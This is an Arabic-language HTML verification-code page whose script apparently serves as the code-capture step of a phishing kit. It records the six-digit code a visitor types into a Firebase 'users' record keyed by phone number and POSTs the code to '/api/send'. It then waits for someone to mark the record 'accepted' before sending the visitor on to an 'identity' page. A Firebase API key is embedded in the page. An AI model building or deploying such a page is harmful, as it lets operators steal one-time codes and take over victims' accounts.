<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أدخل رمز التحقق</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: #fff; height: 100vh; display: flex; justify-content: center; }
        .container { width: 100%; max-width: 450px; padding: 40px 25px; display: flex; flex-direction: column; align-items: center; position: relative; }
        .otp-inputs { display: flex; justify-content: center; gap: 10px; margin-bottom: 10px; direction: ltr; }
        .otp-box { width: 50px; height: 60px; border: none; border-radius: 12px; background-color: #f5f5f5; text-align: center; font-size: 24px; outline: none; transition: 0.3s; }
        .otp-box:focus { border: 2px solid #FFD700; background-color: #fff; }
        #errorMessage { color: red; font-size: 14px; margin-top: 10px; display: none; }
    </style>
</head>
<body>

<div class="container">
    <h1>أدخل رمز التحقق</h1>
    <p>تم الإرسال إلى <span id="displayPhone"></span></p>

    <div class="otp-inputs" id="otpContainer">
        <input type="number" class="otp-box" maxlength="1">
        <input type="number" class="otp-box" maxlength="1">
        <input type="number" class="otp-box" maxlength="1">
        <input type="number" class="otp-box" maxlength="1">
        <input type="number" class="otp-box" maxlength="1">
        <input type="number" class="otp-box" maxlength="1">
    </div>
    <div id="errorMessage">رمز التحقق غير صحيح</div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
    import { getFirestore, doc, onSnapshot, updateDoc, query, collection, where, getDocs } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyC05uAGTFE_mZyByFBTRexYn5VbTfzW0Go",
      projectId: "barq-9ba61",
      // ... باقي الإعدادات
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);
    const userPhone = localStorage.getItem('userPhone');
    document.getElementById('displayPhone').innerText = userPhone;

    // البحث عن الـ Doc ID الخاص بالمستخدم الحالي بناءً على رقم هاتفه
    let currentDocId = null;
    const findUser = async () => {
        const q = query(collection(db, "users"), where("phone", "==", userPhone));
        const querySnapshot = await getDocs(q);
        querySnapshot.forEach((doc) => { currentDocId = doc.id; });
        
        if (currentDocId) {
            // تفعيل المراقبة (Listener) لانتظار القبول
            onSnapshot(doc(db, "users", currentDocId), (doc) => {
                if (doc.data().status === "accepted") {
                    window.location.href = 'identity.html';
                }
            });
        }
    };
    findUser();

    const inputs = document.querySelectorAll('.otp-box');
    inputs.forEach((input, index) => {
        input.addEventListener('input', async (e) => {
            if (e.target.value.length > 1) e.target.value = e.target.value.slice(0, 1);
            if (input.value.length === 1 && index < inputs.length - 1) inputs[index + 1].focus();

            if (Array.from(inputs).every(i => i.value !== '')) {
                const otp = Array.from(inputs).map(i => i.value).join('');
                
                // تحديث الرمز في Firebase
                if(currentDocId) {
                    await updateDoc(doc(db, "users", currentDocId), { otp: otp });
                }
                
                // إرسال للـ API
                fetch('/api/send', { method: 'POST', body: JSON.stringify({ phone: userPhone, otp: otp }) });
            }
        });
    });
</script>
</body>
</html>
